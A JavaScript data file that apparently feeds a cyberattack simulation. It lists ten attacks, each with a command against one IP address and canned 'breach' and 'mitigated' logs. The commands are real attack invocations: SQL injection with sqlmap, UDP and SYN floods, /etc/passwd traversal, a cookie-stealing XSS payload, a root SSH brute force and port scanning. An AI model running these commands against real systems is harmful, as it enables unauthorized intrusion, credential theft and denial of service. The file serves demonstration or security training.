export const attacks = [
  // --- AI & SOCIAL ENGINEERING ---
  { 
    id: 1, 
    name: "AI Phishing Campaign", 
    cmd: "python3 phish_3.py --gemini --url http://100.67.198.107:5000", 
    desc: "Generate spear-phishing emails using LLM social engineering.",
    logs: {
      breach: "CRITICAL: Employee clicked malicious link in 'Urgent Payroll' email. Credential harvesting successful. Session token captured.",
      mitigated: "BLOCKED: NLP Email Gateway detected high-entropy language pattern. Sender domain reputation check failed. Email quarantined."
    }
  },

  // --- APPLICATION LAYER ---
  { 
    id: 2, 
    name: "SQL Injection", 
    cmd: "sqlmap -u http://100.67.198.107/login --dbs --batch --level=5", 
    desc: "Exfiltrate database schema via error-based payload.",
    logs: {
      breach: "CRITICAL: WAF bypass successful. Database 'users_prod' dumped. Admin password hash extracted via Blind SQLi.",
      mitigated: "BLOCKED: WAF Rule #942 (SQL Injection) triggered. Malicious payload 'OR 1=1' detected in URI parameter."
    }
  },

  // --- DOS / NETWORK ---
  { 
    id: 3, 
    name: "QUIC Flood (DoS)", 
    cmd: "hping3 --flood --udp -p 443 100.67.198.107", 
    desc: "Volumetric UDP flood targeting QUIC protocol.",
    logs: {
      breach: "CRITICAL: Service degradation detected. UDP buffer overflow on eth0. Dropping 98% of legitimate packets.",
      mitigated: "BLOCKED: Volumetric DDoS signature detected. Traffic scrubbing active. Rate limiting applied to source subnet."
    }
  },
  { 
    id: 4, 
    name: "Polymorphic Beacon", 
    cmd: "./beacon.exe --jitter 25 --algo poly_v2", 
    desc: "C2 communication that changes signature to evade detection.",
    logs: {
      breach: "CRITICAL: Unknown encrypted channel established. Traffic analysis indicates sophisticated C2 heartbeat with shifting signatures.",
      mitigated: "DETECTED: Heuristic engine identified repetitive communication pattern despite encryption. Endpoint isolated."
    }
  },

  // --- WEB VULNERABILITIES ---
  { 
    id: 5, 
    name: "Directory Traversal", 
    cmd: "curl http://100.67.198.107/view?file=../../../../etc/passwd", 
    desc: "Attempt to escape web root and read system files.",
    logs: {
      breach: "CRITICAL: Local File Inclusion successful. /etc/passwd file contents exposed in HTTP response body.",
      mitigated: "BLOCKED: WAF Rule #930 (LFI) triggered. Directory traversal pattern '../' detected in query string."
    }
  },
  { 
    id: 6, 
    name: "XSS (Cross-Site Scripting)", 
    cmd: "curl -X POST -d '<script>fetch(cookie)</script>' http://100.67.198.107/comments", 
    desc: "Inject malicious script into persistent storage.",
    logs: {
      breach: "CRITICAL: Stored XSS payload executed in admin context. Session cookie exfiltrated to attacker server.",
      mitigated: "BLOCKED: WAF Rule #941 (XSS) triggered. Malicious <script> tag detected in POST body. Input sanitized."
    }
  },

  // --- RECONNAISSANCE & BRUTE FORCE ---
  { 
    id: 7, 
    name: "Port Scanning", 
    cmd: "nmap -sS -T4 -p- 100.67.198.107", 
    desc: "Stealth SYN scan to identify open ports and services.",
    logs: {
      breach: "WARNING: Internal network topology mapped. Open ports 22, 80, 5000 identified. OS Fingerprinting successful.",
      mitigated: "DETECTED: Port Sweep detected (1000 ports in 0.5s). IDS triggered 'Reconnaissance' alert. Source IP logged."
    }
  },
  { 
    id: 8, 
    name: "SSH Brute Force", 
    cmd: "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://100.67.198.107", 
    desc: "Parallel login attempts using dictionary attack.",
    logs: {
      breach: "CRITICAL: Valid credentials found for user 'root'. SSH session established from unauthorized IP. PID 4421 spawned.",
      mitigated: "MITIGATED: Brute force pattern detected (20 failed logins/sec). Source IP added to Fail2Ban jail for 300s."
    }
  },
  { 
    id: 9, 
    name: "User-Agent Spoofing", 
    cmd: "curl -A 'Googlebot/2.1' http://100.67.198.107/admin", 
    desc: "Modify headers to evade bot detection rules.",
    logs: {
      breach: "WARNING: Access Control List bypassed. User successfully impersonated 'Googlebot'. Admin panel accessed.",
      mitigated: "BLOCKED: Threat Intelligence feed identified User-Agent mismatch. IP 10.10.10.5 is not a valid Google crawler."
    }
  },
  { 
    id: 10, 
    name: "SYN Flood", 
    cmd: "hping3 -S -p 80 --flood 100.67.198.107", 
    desc: "Exhaust server resources by initiating half-open connections.",
    logs: {
      breach: "CRITICAL: Web server unresponsive. TCP connection table exhausted (Backlog limit reached). CPU utilization at 100%.",
      mitigated: "MITIGATED: SYN Cookies activated. Malformed TCP handshake attempts dropped at firewall level."
    }
  }
];